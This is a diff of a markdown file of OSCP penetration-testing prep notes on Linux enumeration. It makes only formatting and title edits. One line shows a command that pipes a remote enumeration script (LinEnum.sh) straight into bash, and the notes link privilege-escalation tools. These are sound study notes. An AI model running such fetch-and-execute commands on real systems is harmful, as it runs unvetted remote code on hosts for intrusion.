@@ -1,4 +1,4 @@
-# OSCP Prep Notes
+# Linux
 
 ## Linux
 
@@ -19,7 +19,7 @@ full linux enumeration:
 * [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
 * [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-download  __and __ execute script \(such as LinEnum.sh\) \[from remote host\]: `curl <url or IP>/LinEnum.sh | bash`
+download **and**  execute script \(such as LinEnum.sh\) \[from remote host\]: `curl <url or IP>/LinEnum.sh | bash`
 
 Locate exploits:
 
@@ -160,3 +160,4 @@ Makes PWD part of path so dont need './' \[NOT RECOMMENDED!\]: `export PATH='pwd
 cycle through previous arguments: `alt-.`
 
 move between "words" on a command line `ctrl-[arrow_keys]`
+
